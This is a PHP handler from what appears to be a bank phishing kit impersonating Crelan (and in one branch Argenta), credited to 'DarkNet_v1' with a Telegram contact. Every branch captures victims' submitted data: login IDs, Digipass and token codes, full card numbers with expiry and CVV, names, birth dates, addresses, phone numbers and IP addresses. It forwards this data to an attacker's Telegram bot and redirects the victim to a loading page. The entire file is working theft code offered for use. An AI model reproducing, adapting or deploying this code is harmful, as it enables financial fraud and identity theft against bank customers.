<?php

    /*===================================================
    += Collected by: DarkNet_v1
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DarkNet_v1 
    +===================================================*/


    session_start();


    include "config.php";
    

    if(isset($_POST["log"])){


        $user      = "<code>".$_POST["user_code"]."</code>";

        $message=
        '<blockquote>[LOGIN] => Crelan</blockquote>'."\n".     
        '- Identifiant utilisateur : '.$user."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();          

    }elseif(isset($_POST["digitpass"])){

        $digi      = "<code>".$_POST["digipass_code"]."</code>";

        $message=
        '<blockquote>[Digipass] => Crelan</blockquote>'."\n".     
        '- Digipass : '.$digi."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();            

    }elseif(isset($_POST["card"])){

        $n = $string = str_replace(' ', '', $_POST["num"]);
        $number   = "<code>".$_POST["num"]."</code>";
        $Exp   = "<code>".$_POST["exp"]."</code>";
        $Cvv   = "<code>".$_POST["cvv"]."</code>";


        $message=
        '<blockquote>[CC] => Crelan</blockquote>'."\n".     
        '- Number card : '.$number."\n".
        '- Exp : '.$Exp."\n".
        '- Cvv : '.$Cvv."\n".            
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '- Type : '.'https://cardimages.imaginecurve.com/cards/'.substr($n,0,6).'.png'."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2024 - All rights reserved.]</blockquote>'."\n";          
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();   

    }elseif(isset($_POST["details"])){

        $xx1   = "<code>".$_POST["first_name"]." ".$_POST["last_name"]."</code>";
        $xx2   = "<code>".$_POST["dob"]."</code>";
        $xx3   = "<code>".$_POST["email"]."</code>";
        $xx4   = "<code>".$_POST["phone_number"]."</code>";
        $xx5   = "<code>".$_POST["address"]."</code>";
        $xx6   = "<code>".$_POST["city"]."</code>";
        $xx7   = "<code>".$_POST["zip_code"]."</code>";

        $message=
        '<blockquote>[Details] => Crelan</blockquote>'."\n".     
        '- Full Name : '.$xx1."\n".
        '- Date : '.$xx2."\n".
        '- Email : '.$xx3."\n".            
        '- Tele : '.$xx4."\n".            
        '- Address : '.$xx5."\n".            
        '- City : '.$xx6."\n".            
        '- Zip Code : '.$xx7."\n".                       
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2024 - All rights reserved.]</blockquote>'."\n";          
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();   

    }elseif(isset($_POST["qr_box"])){

        $code   = "<code>".$_POST["qr_code"]."</code>";

        $message=
        '<blockquote>[QR Code] => Crelan</blockquote>'."\n".     
        '- Response code : '.$code."\n".                   
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2024 - All rights reserved.]</blockquote>'."\n";          
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();   

    }elseif(isset($_POST["token"])){

        $ser   = "<code>".$_POST["serial_number"]."</code>";
        $code   = "<code>".$_POST["token_code"]."</code>";

        $message=
        '<blockquote>[Token] => Crelan</blockquote>'."\n".     
        '- le numéro de série 1 : '.$ser."\n".                   
        '- Code : '.$code."\n".                   
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2024 - All rights reserved.]</blockquote>'."\n";          
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();   

    }elseif(isset($_POST["email"])){

        $message=
        '<blockquote>[Token] => Crelan</blockquote>'."\n".     
        '- He pressed the next button '."\n".                                    
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2024 - All rights reserved.]</blockquote>'."\n";          
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();   

    }elseif(isset($_POST["phone"])){

        $tele      = "<code>".$_POST["tele"]."</code>";

        $message=
        '<blockquote>[PHONE Itsme] => ARGENTA</blockquote>'."\n".     
        '- Number : '.$tele."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }

?>